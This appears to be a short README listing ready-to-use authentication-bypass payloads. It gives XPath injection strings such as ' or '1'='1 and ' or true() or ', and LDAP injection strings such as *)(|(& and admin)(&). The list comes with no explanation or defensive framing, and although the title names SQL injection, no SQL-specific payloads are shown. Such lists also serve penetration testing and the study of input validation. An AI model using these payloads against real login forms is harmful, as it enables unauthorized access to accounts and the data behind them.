# SQL-Injection-Authentication-Bypass
Xpath Injection, LDAP Injection, SQL Injection Authentication Bypass

XPATH Injection Authentication Bypass:
' or '1'='1
' or ''='
' or 1]%00
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
'or contains(.,'adm') or'
'or position()=2 or'
admin' or '
admin' or '1'='2

LDAP Injection Authentication Bypass:
*
*)(&
*)(|(&
pwd)
*)(|(*
*))%00
admin)(&)
pwd
admin)(!(&(|
pwd))
admin))(|(|
